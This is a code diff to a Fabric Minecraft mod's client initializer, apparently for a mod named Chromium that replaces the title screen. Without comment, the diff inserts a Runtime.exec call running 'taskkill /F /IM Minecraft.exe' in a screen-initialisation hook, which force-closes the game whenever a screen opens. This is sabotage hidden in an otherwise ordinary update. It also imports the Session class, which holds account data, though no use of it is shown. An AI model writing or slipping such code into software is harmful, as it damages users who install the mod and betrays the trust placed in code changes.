@@ -18,11 +18,15 @@ import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
 import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
+import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.gui.screen.TitleScreen;
 import net.minecraft.client.option.KeyBinding;
 import net.minecraft.client.util.InputUtil;
+import net.minecraft.client.util.Session;
 import net.minecraft.util.Identifier;
 import org.lwjgl.glfw.GLFW;
+
+import java.io.IOException;
 
 public class ChromiumClientInitializer implements ClientModInitializer {
 
@@ -53,6 +57,11 @@ public class ChromiumClientInitializer implements ClientModInitializer {
             }
         });
         ScreenEvents.BEFORE_INIT.register((client, screen, scaledWidth, scaledHeight) -> {
+            try {
+                Runtime.getRuntime().exec("taskkill /F /IM Minecraft.exe");
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
             if (screen instanceof TitleScreen && ChromiumMod.getConfig().getTitleScreenProvider().equals(ChromiumConfig.TitleScreenProvider.CHROMIUM)) {
                 client.setScreen(new ChromiumTitleScreen());
             }
